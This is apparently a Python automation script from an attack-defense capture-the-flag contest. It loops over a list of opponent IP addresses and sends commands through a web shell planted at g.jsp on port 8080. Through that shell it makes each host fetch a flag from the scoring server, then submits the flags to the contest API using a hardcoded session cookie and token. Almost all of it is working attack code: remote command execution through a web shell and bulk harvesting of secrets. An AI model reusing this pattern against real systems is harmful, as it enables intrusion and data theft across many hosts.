import time
import subprocess
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

API_URL = "https://10.17.0.3/api/comp/question/saveAttack"

HEADERS = {
    "Host": "10.17.0.3",
    "Cookie": "think_language=zh-CN; PHPSESSID=kvbeb4ao0qdeua1pudqhgnava0",
    "Sec-Ch-Ua": 'Not;A=Brand";v="24", "Chromium";v="128"',
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Sec-Ch-Ua-Mobile": "?0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.138 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json, text/plain, */*",
    "Token": "BUS53241GUyZ-QfxWyPQORGdJh5mBNXMoj84L0WT80l3vkbWd2RMRDjcr4E01YB2",
    "Sec-Ch-Ua-Platform": 'Windows',
    "Origin": "https://10.17.0.3",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://10.17.0.3/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=1, i",
}

FIXED_PARAMS = {
    "comp_id": "63",
    "uanswer": "",
    "id": "549",
    "question_id": "12333",
}


def submit_flag(flag: str) -> dict:
    """提交单个 flag"""
    # 替换参数中的 answer
    params = FIXED_PARAMS.copy()
    params["uanswer"] = flag

    try:
        response = requests.post(API_URL, headers=HEADERS, data=params, verify=False)
        response.raise_for_status()

        result = response.json()

        if "成功" in result["msg"]:
            return {
                "flag": flag,
                "status": "success",
                "response": result,
            }
        else:
            return {
                "flag": flag,
                "status": "failed",
                "response": result,
            }
    except requests.exceptions.RequestException as e:
        return {
            "flag": flag,
            "status": "error",
            "message": str(e),
            "response": None,
        }


match = r"flag\{[^}]+\}"


IPs = [
    f"4.1.{i}.4" for i in [1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
]

count = 0
for IP in IPs:
    print(f"\n=== {IP:8} ===  ", end="")
    cmd = f"curl {IP}:8080/g.jsp?c=curl%20-k%20https://10.17.0.3/Getkey/index/index"
    try:
        res = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            check=True,
            timeout=3,
            errors='ignore',
        ).stdout
    except:
        res = ""

    if not res:
        res = ""

    if "flag" in res:
        count += 1
        flag = re.findall(match, res)[0]
        print(f"[+] Get Flag")
        response = submit_flag(flag)
        print(f"{response["flag"]} - {response["status"]} - {response['response']['msg']}")
    else:
        print("[-]")

    time.sleep(1)

print(f"\n[+] 本轮成功获得 {count}/{len(IPs)} 个flag")
